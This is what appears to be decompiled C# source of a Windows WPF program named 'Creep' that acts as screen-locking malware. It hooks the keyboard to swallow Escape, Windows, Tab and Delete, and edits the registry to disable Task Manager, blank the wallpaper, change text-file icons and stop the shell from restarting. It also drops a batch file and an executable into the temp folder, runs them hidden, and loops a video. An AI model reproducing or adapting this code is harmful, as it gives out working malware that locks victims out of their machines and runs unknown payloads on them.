using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Markup;
using Creep.Properties;
using Microsoft.Win32;
using Utilities;

namespace Creep;

public class MainWindow : Window, IComponentConnector
{
	private GlobalKeyboardHook gkh;

	internal MainWindow main;

	internal MediaElement video;

	private bool _contentLoaded;

	public MainWindow()
	{
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		Console.WriteLine("beginning!");
		gkh = new GlobalKeyboardHook();
		gkh.HookedKeys.Add((Keys)27);
		gkh.HookedKeys.Add((Keys)91);
		gkh.HookedKeys.Add((Keys)92);
		gkh.HookedKeys.Add((Keys)9);
		gkh.HookedKeys.Add((Keys)46);
		gkh.KeyDown += new KeyEventHandler(handleKey);
		gkh.hook();
		WorkWorkWorkWork();
		InitializeComponent();
	}

	private void handleKey(object sender, KeyEventArgs e)
	{
		e.set_Handled(true);
	}

	private void main_PreviewKeyDown(object sender, KeyEventArgs e)
	{
		((RoutedEventArgs)e).set_Handled(true);
	}

	public void WorkWorkWorkWork()
	{
		string tempPath = Path.GetTempPath();
		File.WriteAllBytes(tempPath + "icon.ico", Resources.texticon);
		RegistryKey registryKey = Registry.ClassesRoot.CreateSubKey("txtfile\\DefaultIcon");
		registryKey.SetValue("", tempPath + "icon.ico");
		registryKey.Close();
		registryKey = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey.SetValue("Wallpaper", "");
		registryKey.Close();
		registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", "1");
		registryKey.Close();
		registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
		registryKey.Close();
		File.WriteAllBytes(tempPath + "text.txt", Resources.txt);
		File.WriteAllBytes(tempPath + "windl.bat", Resources.windl);
		File.WriteAllBytes(tempPath + "one.rtf", Resources.one);
		File.WriteAllBytes(tempPath + "rniw.exe", Resources.subox);
		ProcessStartInfo processStartInfo = new ProcessStartInfo(tempPath + "windl.bat");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = false;
		Process.Start(processStartInfo);
	}

	private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
	{
		MediaElement val = (MediaElement)((sender is MediaElement) ? sender : null);
		val.set_Position(TimeSpan.FromMilliseconds(1.0));
	}

	private void video_Loaded(object sender, RoutedEventArgs e)
	{
		string text = Path.GetTempPath() + "v.mp4";
		File.WriteAllBytes(text, Resources.street);
		video.set_Source(new Uri(text));
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	public void InitializeComponent()
	{
		if (!_contentLoaded)
		{
			_contentLoaded = true;
			Uri uri = new Uri("/000;component/mainwindow.xaml", UriKind.Relative);
			Application.LoadComponent((object)this, uri);
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Expected O, but got Unknown
		switch (connectionId)
		{
		default:
			_contentLoaded = true;
			break;
		case 2:
			video = (MediaElement)target;
			((FrameworkElement)video).add_Loaded(new RoutedEventHandler(video_Loaded));
			video.add_MediaEnded(new RoutedEventHandler(MediaElement_MediaEnded));
			break;
		case 1:
			main = (MainWindow)target;
			((UIElement)main).add_PreviewKeyDown(new KeyEventHandler(main_PreviewKeyDown));
			break;
		}
	}
}
